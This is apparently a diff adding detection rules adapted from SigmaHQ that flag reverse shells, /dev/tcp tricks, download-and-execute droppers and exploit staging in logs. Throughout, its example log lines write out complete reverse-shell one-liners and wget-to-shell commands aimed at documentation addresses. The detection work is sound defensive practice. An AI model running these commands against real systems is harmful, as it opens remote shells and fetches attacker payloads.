@@ -1,0 +1,2577 @@
+# Mention patterns imported from SigmaHQ rules whose detection is a free-text `keywords` list (Linux builtin logs,
+# web server and application logs, Cisco AAA command accounting). Rules are read at SigmaHQ commit
+# 698f0912f571d5fac3bf8c51f5421139834a011c and imported under the Detection Rule License 1.1 (attribution: the rule
+# author and the upstream rule id in each entry's source).
+#
+# Import notes:
+# - Sigma keywords match case-insensitively, so every entry here is case_sensitive: false unless a narrower reading
+#   is stated in the rationale.
+# - A keyword containing `*` becomes an anchored pattern with a bounded gap ([^\n]{0,N}) in place of the wildcard.
+# - Keywords that are too short or too common to be a useful mention are left out; the rationale of the entry for
+#   that rule names what was left out.
+# - A rule's keywords are split across several entries when their benign rates differ (strong, medium, weak).
+# - Each line that matches is a mention: it says the text was seen, never that the action ran.
+
+- id: mention.sigma_reverse_shell_cmdline
+  title: Reverse shell one-liner text (Sigma "Suspicious Reverse Shell Command Line")
+  match:
+    literal:
+      - 'BEGIN {s = "/inet/tcp/0/'
+      - 'bash -i >& /dev/tcp/'
+      - 'bash -i >& /dev/udp/'
+      - 'sh -i >$ /dev/udp/'
+      - 'sh -i >$ /dev/tcp/'
+      - '&& while read line 0<&5; do'
+      - '/bin/bash -c exec 5<>/dev/tcp/'
+      - '/bin/bash -c exec 5<>/dev/udp/'
+      - 'nc -e /bin/sh '
+      - '/bin/sh | nc'
+      - 'rm -f backpipe; mknod /tmp/backpipe p && nc '
+      - ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'
+      - ';STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+      - '/bin/sh -i <&3 >&3 2>&3'
+      - 'uname -a; w; id; /bin/bash -i'
+      - '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};'
+      - ';os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(''HISTFILE'',''/dev/null'');'
+      - '.to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+      - ';while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print'
+      - 'socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:'
+      - 'rm -f /tmp/p; mknod /tmp/p p &&'
+      - ' | /bin/bash | telnet '
+      - ',echo=0,raw tcp-listen:'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
+    license: DRL-1.1
+    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
+  rationale: >-
+    Each string is a fragment of a published reverse-shell one-liner (bash /dev/tcp redirection, perl/python/ruby
+    socket shells, socat and mknod/telnet pipes, the PowerShell TCP client loop). Administrators have no reason to
+    type these exact fragments; the realistic benign source is training material or a pasted cheat sheet in a ticket
+    or chat log. The listener ('nc -lvvp ') and 'xterm -display 1' keywords of the same rule are split into
+    separate medium and weak entries because they have ordinary uses.
+  examples:
+    positive:
+      - 'Nov 20 10:01:02 web01 bash[4242]: HISTORY: PID=4242 UID=33 bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
+      - 'audit: cmdline="python3 -c import socket,os;s=socket.socket();s.connect((\"203.0.113.7\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(''HISTFILE'',''/dev/null'');"'
+      - 'Nov 20 10:05:00 app02 sh[311]: rm -f /tmp/p; mknod /tmp/p p && telnet 198.51.100.4 80 0</tmp/p | /bin/bash 1>/tmp/p'
+      - 'Nov 21 09:00:01 web01 bash[4100]: HISTORY: awk ''BEGIN {s = "/inet/tcp/0/203.0.113.7/4444"; while(42) {}}'' /dev/null'
+      - 'Nov 21 09:00:02 web01 bash[4100]: HISTORY: bash -i >& /dev/udp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:03 web01 bash[4100]: HISTORY: sh -i >$ /dev/udp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:04 web01 bash[4100]: HISTORY: sh -i >$ /dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:05 web01 bash[4100]: HISTORY: exec 5<>/dev/tcp/203.0.113.7/4444 && while read line 0<&5; do $line 2>&5 >&5; done'
+      - 'Nov 21 09:00:06 web01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:07 web01 bash[4100]: HISTORY: /bin/bash -c exec 5<>/dev/udp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:08 web01 bash[4100]: HISTORY: nc -e /bin/sh 203.0.113.7 4444'
+      - 'Nov 21 09:00:09 web01 bash[4100]: HISTORY: /bin/sh | nc 203.0.113.7 4444'
+      - 'Nov 21 09:00:10 web01 bash[4100]: HISTORY: rm -f backpipe; mknod /tmp/backpipe p && nc 203.0.113.7 4444'
+      - 'Nov 21 09:00:11 web01 bash[4100]: HISTORY: perl -e ''use Socket;$i="203.0.113.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");exec("/bin/sh -i");};'''
+      - 'Nov 21 09:00:12 web01 bash[4100]: HISTORY: perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"203.0.113.7:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'''
+      - 'Nov 21 09:00:13 web01 bash[4100]: HISTORY: /bin/sh -i <&3 >&3 2>&3'
+      - 'Nov 21 09:00:14 web01 bash[4100]: HISTORY: uname -a; w; id; /bin/bash -i'
+      - 'powershell -nop -c "... $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};"'
+      - 'Nov 21 09:00:15 web01 bash[4100]: HISTORY: ruby -rsocket -e''f=TCPSocket.open("203.0.113.7",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'''
+      - 'Nov 21 09:00:16 web01 bash[4100]: HISTORY: ruby -rsocket -e ''c=TCPSocket.new("203.0.113.7","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'''
+      - 'Nov 21 09:00:17 web01 bash[4100]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
+      - 'Nov 21 09:00:18 web01 bash[4100]: HISTORY: telnet 203.0.113.7 8080 | /bin/bash | telnet 203.0.113.7 8081'
+      - 'Nov 21 09:00:19 web01 bash[4100]: HISTORY: socat file:`tty`,echo=0,raw tcp-listen:4444'
+    negative:
+      - 'Nov 20 10:06:00 app02 sudo[9930]: alice : COMMAND=/usr/bin/nc -zv db01 5432'
+      - 'Nov 20 10:07:00 app02 bash[812]: HISTORY: PID=812 UID=1000 bash -i ./deploy.sh --env staging'
+      - 'Nov 20 10:08:00 app02 healthcheck: timeout 2 bash -c "</dev/tcp/127.0.0.1/8080" && echo ok'
+
+- id: mention.sigma_reverse_shell_listener
+  title: Verbose netcat listener (Sigma "Suspicious Reverse Shell Command Line", listener keyword)
+  match:
+    literal: ['nc -lvvp ']
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.004, T1095]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
+    license: DRL-1.1
+    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
+  rationale: >-
+    A verbose netcat listener on a fixed port is the catching side of a reverse shell or a bind shell. Engineers also
+    open quick netcat listeners to test firewall paths, so this is medium, not strong.
+  examples:
+    positive:
+      - 'Nov 20 11:00:00 jump01 bash[777]: HISTORY: PID=777 UID=0 nc -lvvp 4444'
+    negative:
+      - 'Nov 20 11:01:00 jump01 bash[777]: HISTORY: PID=777 UID=0 nc -l 9000 > /tmp/image.tar'
+      - 'Nov 20 11:02:00 jump01 bash[777]: HISTORY: PID=777 UID=0 ncat --listen --keep-open 8443 --ssl'
+
+- id: mention.sigma_reverse_shell_xterm_display
+  title: 'xterm -display 1 text (Sigma "Suspicious Reverse Shell Command Line", xterm keyword)'
+  match:
+    literal: ['xterm -display 1']
+  case_sensitive: false
+  strength: weak
+  attack: [T1059.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Reverse Shell Command Line (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_rev_shells.yml
+    license: DRL-1.1
+    upstream_id: 738d9bcf-6999-4fdb-b4ac-3033037db8ab
+  rationale: >-
+    xterm pointed at a remote X display is a classic reverse shell, but the keyword also matches local displays such as
+    127.0.0.1:0 and remote-desktop setups, so it is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 11:03:00 lab01 bash[910]: HISTORY: PID=910 UID=33 xterm -display 198.51.100.9:1'
+    negative:
+      - 'Nov 20 11:04:00 lab01 bash[910]: HISTORY: PID=910 UID=1000 xterm -geometry 80x24'
+      - 'Nov 20 11:05:00 lab01 Xorg[600]: (II) xterm display :0 started for user alice'
+
+- id: mention.sigma_dev_tcp_shell
+  title: 'Shell redirection onto /dev/tcp (Sigma "Suspicious Use of /dev/tcp", shell keywords)'
+  match:
+    literal:
+      - '0<&196;exec 196<>/dev/tcp/'
+      - '(sh)0>/dev/tcp/'
+      - 'bash -c ''bash -i >& /dev/tcp/'
+      - 'echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/'
+      - 'sh -i >& /dev/udp/'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Use of /dev/tcp (frack113)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_susp_dev_tcp.yml
+    license: DRL-1.1
+    upstream_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
+  rationale: >-
+    These keywords attach an interactive shell's file descriptors to a bash /dev/tcp or /dev/udp socket, which is the
+    reverse-shell idiom; benign health checks open /dev/tcp only to test a port. The rule's 'bash -i >& /dev/tcp/'
+    keyword is carried by mention.sigma_reverse_shell_cmdline, and its fd-open and probe keywords are separate medium
+    and weak entries.
+  examples:
+    positive:
+      - 'Nov 20 12:00:00 web01 bash[5011]: HISTORY: 0<&196;exec 196<>/dev/tcp/203.0.113.7/443; sh <&196 >&196 2>&196'
+      - 'Nov 20 12:01:00 web01 php-fpm[880]: exec("bash -c ''bash -i >& /dev/tcp/203.0.113.7/80 0>&1''")'
+      - 'Nov 21 09:00:20 web01 bash[4100]: HISTORY: (sh)0>/dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:21 web01 bash[4100]: HISTORY: echo -e ''#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
+      - 'Nov 21 09:00:22 web01 bash[4100]: HISTORY: sh -i >& /dev/udp/203.0.113.7/4444 0>&1'
+    negative:
+      - 'Nov 20 12:02:00 web01 healthcheck: bash -c "echo > /dev/tcp/127.0.0.1/5432" && echo db up'
+      - 'Nov 20 12:03:00 web01 bash[5011]: HISTORY: exec 3<>/dev/null; echo done'
+
+- id: mention.sigma_dev_tcp_fd
+  title: 'Numbered-descriptor open of bash /dev/tcp (Sigma "Suspicious Use of /dev/tcp", fd keywords)'
+  match:
+    literal: ['cat </dev/tcp/', 'exec 3<>/dev/tcp/', 'exec 5<>/dev/tcp/']
+  case_sensitive: false
+  strength: medium
+  attack: [T1059.004, T1095, T1046]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Use of /dev/tcp (frack113)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_susp_dev_tcp.yml
+    license: DRL-1.1
+    upstream_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
+  rationale: >-
+    Opening a bash /dev/tcp socket on a numbered descriptor is how shell-only reverse shells, port scanners and
+    download-without-curl tricks start. Minimal containers also use it for HTTP health checks, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 12:04:00 web01 bash[5012]: HISTORY: exec 5<>/dev/tcp/203.0.113.7/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
+      - 'Nov 20 12:05:00 web01 bash[5013]: HISTORY: cat </dev/tcp/203.0.113.7/8000 > /tmp/.x'
+    negative:
+      - 'Nov 20 12:06:00 web01 bash[5014]: HISTORY: exec 3>&1 4>&2'
+      - 'Nov 20 12:07:00 web01 bash[5015]: HISTORY: cat /var/log/nginx/access.log | tail -n 20'
+
+- id: mention.sigma_dev_tcp_probe
+  title: Port probe through bash /dev/tcp (Sigma "Suspicious Use of /dev/tcp", probe keyword)
+  match:
+    literal: ['echo >/dev/tcp/']
+  case_sensitive: false
+  strength: weak
+  attack: [T1046]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Use of /dev/tcp (frack113)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_susp_dev_tcp.yml
+    license: DRL-1.1
+    upstream_id: 6cc5fceb-9a71-4c23-aeeb-963abe0b279c
+  rationale: >-
+    Writing nothing to /dev/tcp/host/port tests whether a port is open. Attackers use it for scanning from shells
+    without tools, and wait-for-port scripts use it constantly, so it is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 12:08:00 web01 bash[5016]: HISTORY: for p in 22 80 443; do echo >/dev/tcp/10.0.0.5/$p && echo $p open; done'
+    negative:
+      - 'Nov 20 12:09:00 web01 bash[5017]: HISTORY: echo hello > /tmp/test.txt'
+      - 'Nov 20 12:10:00 web01 bash[5018]: HISTORY: nc -z 10.0.0.5 22'
+
+- id: mention.sigma_shell_wget_pipe_interpreter
+  title: 'wget with a pipe into a shell or perl (Sigma "Suspicious Activity in Shell Commands")'
+  match:
+    anchored: 'wget [^\n]{0,150} - http[^\n]{0,200} \| (?:perl|sh|bash)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1059.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    Translation of the keywords 'wget * - http* | perl|sh|bash' with bounded gaps. Fetching a script to stdout and
+    piping it into an interpreter is the classic dropper. Some vendor installers are published the same way, so the
+    mention is medium; the URL host and what runs next decide it.
+  examples:
+    positive:
+      - 'Nov 20 12:11:00 web01 bash[5019]: HISTORY: wget -q -O - http://203.0.113.7/x.sh | sh'
+    negative:
+      - 'Nov 20 12:12:00 web01 bash[5020]: HISTORY: wget -O /tmp/release.tar.gz https://downloads.example.org/release.tar.gz'
+      - 'Nov 20 12:13:00 web01 bash[5021]: HISTORY: wget -q -O - https://repo.example.org/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg'
+
+- id: mention.sigma_shell_python_http_server
+  title: Python ad-hoc HTTP server (Sigma "Suspicious Activity in Shell Commands")
+  match:
+    literal: ['python -m SimpleHTTPServer', '-m http.server']
+  case_sensitive: false
+  strength: weak
+  attack: [T1105]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    A throwaway Python web server is how intruders stage tools or pull files off a host, but developers use it every
+    day to share a directory, so it is a weak candidate.
+  examples:
+    positive:
+      - 'Nov 20 12:14:00 web01 bash[5022]: HISTORY: cd /dev/shm && python3 -m http.server 8081'
+    negative:
+      - 'Nov 20 12:15:00 web01 bash[5023]: HISTORY: python3 -m pip install --user httpie'
+      - 'Nov 20 12:16:00 web01 gunicorn[700]: [INFO] Listening at: http://0.0.0.0:8000 (700)'
+
+- id: mention.sigma_shell_pty_spawn
+  title: Python pty.spawn shell upgrade (Sigma "Suspicious Activity in Shell Commands")
+  match:
+    literal: ['import pty; pty.spawn']
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.006]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    'import pty; pty.spawn' is the standard way to turn a dumb reverse shell into an interactive terminal. Ordinary
+    administration has no use for it; the realistic benign source is a cheat sheet quoted in a ticket.
+  examples:
+    positive:
+      - 'Nov 20 12:17:00 web01 bash[5024]: HISTORY: python -c ''import pty; pty.spawn("/bin/bash")'''
+    negative:
+      - 'Nov 20 12:18:00 web01 bash[5025]: HISTORY: python3 -c "import platform; print(platform.release())"'
+      - 'Nov 20 12:19:00 web01 bash[5026]: HISTORY: script -q /tmp/session.log'
+
+- id: mention.sigma_shell_socat_exec
+  title: 'socat exec: or socat -O /tmp/ text (Sigma "Suspicious Activity in Shell Commands")'
+  match:
+    literal: ['socat exec:', 'socat -O /tmp/']
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1095]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    socat with an EXEC address as its first argument binds a program, usually a shell, to a network stream; this is
+    the full-TTY reverse or bind shell. Plain socat port forwarding (TCP-LISTEN to TCP) does not match.
+  examples:
+    positive:
+      - 'Nov 20 12:20:00 web01 bash[5027]: HISTORY: socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:203.0.113.7:4444'
+      - 'Nov 21 09:00:23 web01 bash[4100]: HISTORY: socat -O /tmp/.x tcp:203.0.113.7:4444'
+    negative:
+      - 'Nov 20 12:21:00 web01 systemd[1]: Started socat TCP-LISTEN:2375,fork UNIX-CONNECT:/var/run/docker.sock'
+      - 'Nov 20 12:22:00 web01 bash[5028]: HISTORY: socat - TCP:db01:5432'
+
+- id: mention.sigma_shell_socat_connect
+  title: socat outbound TCP connect (Sigma "Suspicious Activity in Shell Commands")
+  match:
+    literal: ['socat tcp-connect']
+  case_sensitive: false
+  strength: medium
+  attack: [T1095, T1090]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    socat starting with an outbound TCP-CONNECT address is used for relays and reverse shells; it is also a common
+    admin relay, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 12:23:00 web01 bash[5029]: HISTORY: socat tcp-connect:203.0.113.7:443 exec:/bin/sh'
+    negative:
+      - 'Nov 20 12:24:00 web01 bash[5030]: HISTORY: socat TCP-LISTEN:8080,fork TCP:10.0.0.8:80'
+      - 'Nov 20 12:25:00 web01 bash[5031]: HISTORY: socat -d -d pty,raw,echo=0 pty,raw,echo=0'
+
+- id: mention.sigma_shell_wget_chmod
+  title: 'wget and chmod on one line (Sigma "Suspicious Activity in Shell Commands")'
+  match:
+    anchored: 'wget [^\n]{1,200}; chmod (?:\+x|777 )'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1222.002]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    Translation of '*wget *; chmod +x*' and '*wget *; chmod 777 *'. Download-then-make-executable in one command line
+    is the botnet and cryptominer dropper shape seen in honeypot and exploit logs, but admins fetch and run vendor
+    bootstrap scripts the same way, so it is medium here (high upstream); the URL host and target path decide.
+  examples:
+    positive:
+      - 'Nov 20 12:26:00 web01 bash[5032]: HISTORY: cd /tmp; wget http://203.0.113.7/bins/x86; chmod 777 x86; ./x86'
+      - 'GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget http://198.51.100.2/m.sh; chmod +x m.sh; ./m.sh) HTTP/1.1'
+    negative:
+      - 'Nov 20 12:27:00 web01 bash[5033]: HISTORY: wget https://downloads.example.org/tool.tar.gz && tar xzf tool.tar.gz'
+      - 'Nov 20 12:28:00 web01 bash[5034]: HISTORY: chmod +x ./deploy.sh; ./deploy.sh'
+
+- id: mention.sigma_shell_exploit_staging
+  title: 'Exploit-kit command strings (Sigma "Suspicious Activity in Shell Commands")'
+  match:
+    literal:
+      - 'cd /tmp || cd /var/run || cd /mnt'
+      - 'stop;service iptables stop;'
+      - 'stop;SuSEfirewall2 stop;'
+      - 'chmod 777 2020'
+      - '/chmod u+s '
+      - 'chmod +s /tmp/'
+      - 'chmod u+s /tmp/'
+      - ' /tmp/haxhax'
+      - ' /tmp/ns_sploit'
+      - '/tmp/ysocereal.jar'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.004, T1548.001, T1686]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    Strings lifted from in-the-wild Apache Struts exploit payloads, Mirai-style loaders and Metasploit local exploit
+    modules: directory hopping to a writable path, stopping the host firewall inline, setuid on files in /tmp and
+    fixed exploit artifact names. None of them occur in routine administration.
+  examples:
+    positive:
+      - 'Nov 20 12:29:00 web01 java[2001]: Runtime exec: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://203.0.113.7/a.sh'
+      - 'Nov 20 12:30:00 web01 bash[5035]: HISTORY: chmod u+s /tmp/rootshell'
+      - 'Nov 21 09:00:24 web01 java[2001]: Runtime exec: sh -c stop;service iptables stop; x'
+      - 'Nov 21 09:00:25 web01 java[2001]: Runtime exec: sh -c stop;SuSEfirewall2 stop; x'
+      - 'Nov 21 09:00:26 web01 java[2001]: Runtime exec: sh -c chmod 777 2020 x'
+      - 'Nov 21 09:00:27 web01 java[2001]: Runtime exec: sh -c /chmod u+s x'
+      - 'Nov 21 09:00:28 web01 bash[4100]: HISTORY: chmod +s /tmp/.x'
+      - 'Nov 21 09:00:29 web01 java[2001]: Runtime exec: sh -c /tmp/haxhax x'
+      - 'Nov 21 09:00:30 web01 java[2001]: Runtime exec: sh -c /tmp/ns_sploit x'
+      - 'Nov 21 09:00:31 web01 java[2001]: Runtime exec: sh -c /tmp/ysocereal.jar x'
+    negative:
+      - 'Nov 20 12:31:00 web01 bash[5036]: HISTORY: chmod 755 /usr/local/bin/backup.sh'
+      - 'Nov 20 12:32:00 web01 systemd[1]: Stopping iptables.service - IPv4 firewall with iptables...'
+
+- id: mention.sigma_shell_staging_medium
+  title: 'Dropper command fragments with common admin look-alikes (Sigma "Suspicious Activity in Shell Commands")'
+  match:
+    literal:
+      - 'echo binary >>'
+      - '>>/etc/rc.local'
+      - 'base64 -d /tmp/'
+      - 'nc -l -p '
+      - '; chmod +x /tmp/'
+      - ';chmod +x /tmp/'
+  case_sensitive: false
+  strength: medium
+  attack: [T1105, T1037.004, T1140]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    Building an FTP script with 'echo binary >>', appending to rc.local, decoding into /tmp, a netcat listener and
+    making a /tmp file executable are steps of the exploit chains the rule documents. Each also has scripted admin
+    uses, so the group is medium.
+  examples:
+    positive:
+      - 'Nov 20 12:33:00 web01 bash[5037]: HISTORY: echo "/tmp/.k &" >>/etc/rc.local'
+      - 'Nov 20 12:34:00 web01 bash[5038]: HISTORY: curl -s http://203.0.113.7/k -o /tmp/k; chmod +x /tmp/k'
+    negative:
+      - 'Nov 20 12:35:00 web01 bash[5039]: HISTORY: cat /etc/rc.local'
+      - 'Nov 20 12:36:00 web01 bash[5040]: HISTORY: chmod +x ./bin/run.sh'
+
+- id: mention.sigma_shell_staging_weak
+  title: 'Generic dropper fragments (Sigma "Suspicious Activity in Shell Commands")'
+  match:
+    literal: [' | base64 -d ', 'cp /bin/ksh ', 'cp /bin/sh ', '/tmp/x ']
+  case_sensitive: false
+  strength: weak
+  attack: [T1140, T1059.004]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    Decoding piped base64, copying a system shell and a /tmp/x path appear in the documented exploits, but kubectl
+    secret reads, package scripts and test harnesses produce the same text daily, so they are weak candidates.
+  examples:
+    positive:
+      - 'Nov 20 12:37:00 web01 bash[5041]: HISTORY: cp /bin/sh /tmp/.sh; chmod 4755 /tmp/.sh'
+    negative:
+      - 'Nov 20 12:38:00 web01 bash[5042]: HISTORY: cp /bin/ls /tmp/ls.bak'
+      - 'Nov 20 12:39:00 web01 bash[5043]: HISTORY: base64 -w0 report.pdf > report.b64'
+
+- id: mention.sigma_shell_b64_in_tmp
+  title: 'Base64 file path in /tmp on a command line (Sigma "Suspicious Activity in Shell Commands")'
+  match:
+    anchored: ' /tmp/[^\n]{0,100}\.b64 '
+  case_sensitive: false
+  strength: medium
+  attack: [T1140, T1105]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Suspicious Activity in Shell Commands (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_shell_susp_commands.yml
+    license: DRL-1.1
+    upstream_id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695
+  rationale: >-
+    Translation of '* /tmp/*.b64 *'. Metasploit command stagers write the payload as base64 chunks into a .b64 file
+    in /tmp and decode it; a .b64 file in /tmp in an admin command is unusual.
+  examples:
+    positive:
+      - 'Nov 20 12:40:00 web01 sh[5044]: base64 -d /tmp/QWxlcn.b64 > /tmp/QWxlcn'
+    negative:
+      - 'Nov 20 12:41:00 web01 bash[5045]: HISTORY: base64 -d /home/alice/cert.b64 > cert.der'
+      - 'Nov 20 12:42:00 web01 bash[5046]: HISTORY: ls -l /tmp/'
+
+- id: mention.sigma_buffer_overflow_exploit
+  title: Exploit attempt messages (Sigma "Buffer Overflow Attempts")
+  match:
+    literal: ['attempt to execute code on stack by', '0bin0sh1']
+  case_sensitive: false
+  strength: strong
+  attack: [T1068, T1190]
+  telemetry: [linux_text]
+  source:
+    name: 'SigmaHQ: Buffer Overflow Attempts (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/builtin/lnx_buffer_overflows.yml
+    license: DRL-1.1
+    upstream_id: 18b042f0-2ecd-4b6e-9f8d-aa7a7e7de781
+  rationale: >-
+    The kernel's non-executable-stack message reports a blocked attempt to run code from the stack, and '0bin0sh1'
+    is the shell path smuggled by the WU-FTPD exploit. Neither appears outside exploitation attempts.
+  examples:
+    positive:
+      - 'Nov 20 13:00:00 sol01 genunix: [ID 533030 kern.notice] NOTICE: in.ftpd[1772] attempt to execute code on stack by uid 0'
+      - 'Nov 21 09:00:49 ftp01 ftpd[311]: FTP LOGIN FROM 203.0.113.9 [203.0.113.9], 0bin0sh1'
+    negative:
